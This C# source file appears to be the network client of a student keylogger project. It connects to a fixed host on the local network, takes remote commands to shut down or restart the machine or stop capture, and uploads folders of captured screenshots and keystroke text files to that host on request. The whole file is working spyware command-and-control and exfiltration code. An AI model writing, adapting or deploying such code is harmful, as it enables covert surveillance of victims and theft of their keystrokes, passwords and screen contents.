using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Drawing;
using System.Management;
using System.Drawing.Imaging;

namespace key.TCPAcceptRequest
{
    public class RunServer
    {
        static string filename;
        static string filepath;
        static string foldername;


        static byte[] serverData = new byte[1024];
        static IPEndPoint ipEnd = new IPEndPoint(IPAddress.Parse("192.168.1.4"), 9000);
        static Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        public static void Run()
        {
            client.Connect(ipEnd);
            Console.WriteLine("client connected!!");
            while (true)
            {


                ReceiveData(client);

                //thread.IsBackground = true;
                //thread.Start(client);

                //string s;

                //thread.Join();
            }

            Console.ReadKey();
        }

        static void ReceiveData(Socket client)
        {

            byte[] WebData = new byte[1024 * 8000];
            Console.WriteLine(client.RemoteEndPoint.ToString());
            client.Receive(WebData);        //not do app

            int requestLength = BitConverter.ToInt32(WebData, 0);


            string requestsData = Encoding.ASCII.GetString(WebData, 4, requestLength);
            Console.WriteLine(requestsData.Trim());
            Array.Clear(WebData, 0, WebData.Length);
            string response = string.Empty;


            try
            {
                switch (requestsData.ToLower().Trim())
                {
                    case "shutdown": 
                        {
                            try
                            {
                                TCPAcceptRequest.Request.Instance.AcceptRequestServer("keylog -rd");
                            }
                            catch (Exception t0)
                            {
                                t0.ToString();
                            }
                        } 
                        break;
                    case "restart":
                        {
                            try
                            {
                                TCPAcceptRequest.Request.Instance.AcceptRequestServer("keylog -rs");
                            }
                            catch (Exception t0)
                            {
                                t0.ToString();
                            }
                        }
                        break;
                    case "sendimg": 
                        { 
                            try
                            {
                                Sendimg();
                            }
                            catch (Exception t0)
                            {
                                t0.ToString();
                            }
                        } 
                        break;
                    case "sendtext":
                        {
                            try
                            {
                                Sendtext();
                            }
                            catch (Exception t0)
                            {
                                t0.ToString();
                            }
                        }
                        break;
                    case "keylog -kill capture":
                        {
                            try
                            {
                                TCPAcceptRequest.Request.Instance.AcceptRequestServer("keylog -kill capture");
                            }
                            catch (Exception t0)
                            {
                                t0.ToString();
                            }
                        }
                        break;
                    default:
                        response = "UNKNOW COMMAND"; break;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        public static void Sendimg()
        {
            Console.WriteLine(GetMacAddress());
            string docPath = @"D:\5\PBL4\key\key\bin\Debug\Image";
            foreach (var folder in GetListFolder(docPath))
            {
                foldername = folder.Substring(folder.LastIndexOf("\\") + 1);
                string[] filePath = Directory.GetFiles(folder, "*.*", SearchOption.AllDirectories);


                foreach (var files in filePath)
                {

                    IPAddress[] ipAddress = Dns.GetHostAddresses("localhost");
                    IPEndPoint ipEnd2 = new IPEndPoint(IPAddress.Parse("192.168.1.4"), 8000);
                    Console.WriteLine(ipEnd2.AddressFamily);

                    Socket clientSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    clientSock.Connect(ipEnd2);
                    Console.WriteLine(files);

                    filename = files.Replace("\\", "/");
                    while (filename.IndexOf("/") > -1)
                    {
                        filepath = files.Substring(0, filename.LastIndexOf("/") + 1);
                        filename = files.Substring(filename.LastIndexOf("/") + 1);

                    }


                    /*                    new Thread(delegate ()
                                        {*/

                    FileInfo info = new FileInfo(files);
                    var fileName = Path.GetFileName(info.FullName);

                    byte[] folderNameByte = Encoding.ASCII.GetBytes(foldername);

                    byte[] fileNameByte = Encoding.ASCII.GetBytes(fileName);

                    //byte[] fileData = File.ReadAllBytes(filepath + filename);

                    byte[] fileData = imageToByteArray(Image.FromFile(filepath + filename));

                    byte[] clientData = new byte[4 + 4 + fileNameByte.Length + folderNameByte.Length + fileData.Length];//

                    byte[] fileNameLen = BitConverter.GetBytes(fileNameByte.Length);

                    byte[] folderNameLen = BitConverter.GetBytes(folderNameByte.Length);

                    fileNameLen.CopyTo(clientData, 0);

                    folderNameLen.CopyTo(clientData, 4);

                    fileNameByte.CopyTo(clientData, 4 + 4);//

                    folderNameByte.CopyTo(clientData, 4 + 4 + fileNameByte.Length);//

                    fileData.CopyTo(clientData, 4 + 4 + fileNameByte.Length + folderNameByte.Length);//

                    clientSock.Send(clientData);
                    Array.Clear(clientData, 0, clientData.Length);
                    clientSock.Close();

                    /*}).Start();*/
                }
            }
            StopLoop(8000);

        }
        public static void Sendtext()
        {
            Console.WriteLine("------------------Sendtext------------------");
            string textPath = @"D:\5\PBL4\key\key\bin\Debug\Text";

            foreach (var folder in GetListFolder(textPath))
            {
                Console.WriteLine(folder);
                foldername = folder.Substring(folder.LastIndexOf("\\") + 1);
                //Console.WriteLine(foldername);

                string[] filePath = Directory.GetFiles(folder, "*.*", SearchOption.AllDirectories);

                foreach (var files in filePath)
                {
                    IPEndPoint ipEnd = new IPEndPoint(IPAddress.Parse("192.168.1.4"), 8000);

                    Socket clientSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);

                    clientSock.Connect(ipEnd);
                    filename = files.Replace("\\", "/");
                    while (filename.IndexOf("/") > -1)
                    {
                        filepath = files.Substring(0, filename.LastIndexOf("/") + 1);
                        filename = files.Substring(filename.LastIndexOf("/") + 1);
                    }

                    FileInfo info = new FileInfo(files);
                    var fileName = Path.GetFileName(info.FullName);

                    byte[] folderNameByte = Encoding.ASCII.GetBytes(foldername);

                    byte[] fileNameByte = Encoding.ASCII.GetBytes(fileName);

                    byte[] fileData = File.ReadAllBytes(filepath + filename);

                    byte[] clientData = new byte[4 + 4 + fileNameByte.Length + folderNameByte.Length + fileData.Length];//

                    byte[] fileNameLen = BitConverter.GetBytes(fileNameByte.Length);

                    byte[] folderNameLen = BitConverter.GetBytes(folderNameByte.Length);

                    fileNameLen.CopyTo(clientData, 0);

                    folderNameLen.CopyTo(clientData, 4);

                    fileNameByte.CopyTo(clientData, 4 + 4);//

                    folderNameByte.CopyTo(clientData, 4 + 4 + fileNameByte.Length);//

                    fileData.CopyTo(clientData, 4 + 4 + fileNameByte.Length + folderNameByte.Length);//

                    //Console.WriteLine((clientData.Length));

                    //clientSock.Connect(ipEnd);
                    clientSock.Send(clientData);
                    Array.Clear(clientData, 0, clientData.Length);
                    clientSock.Close();
                }
            }
            StopLoop(8000);


        }
        public static void StopLoop(int port)
        {
            IPEndPoint ipEnd1 = new IPEndPoint(System.Net.IPAddress.Parse("192.168.1.4"), port);
            Socket clientSock1 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            clientSock1.Connect(ipEnd1);
            byte[] done = Encoding.ASCII.GetBytes("done");
            byte[] clientData1 = new byte[4 + done.Length];//
            byte[] donelen = BitConverter.GetBytes(done.Length);
            donelen.CopyTo(clientData1, 0);
            done.CopyTo(clientData1, 4);
            Console.WriteLine("done");
            clientSock1.Send(clientData1);
            clientSock1.Close();
        }
        public static List<string> GetListFolder(string path)
        {
            List<string> list = new List<string>();
            DirectoryInfo dirPrograms = new DirectoryInfo(path);

            var dirs = from dir in dirPrograms.EnumerateDirectories()
                       select new
                       {
                           ProgDir = dir,
                       };

            foreach (var di in dirs)
            {
                string s = ($"{di.ProgDir.FullName}").ToString();
                list.Add(s);
            }
            return list;
        }
        private static string GetMacAddress()
        {
            string macAddresses = string.Empty;

            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.OperationalStatus == OperationalStatus.Up)
                {
                    macAddresses += nic.GetPhysicalAddress().ToString();
                    break;
                }
            }

            return macAddresses;
        }
        public static byte[] imageToByteArray(Image imageIn)
        {
            MemoryStream ms = new MemoryStream();
            imageIn.Save(ms, ImageFormat.Gif);
            return ms.ToArray();
        }
    }
}
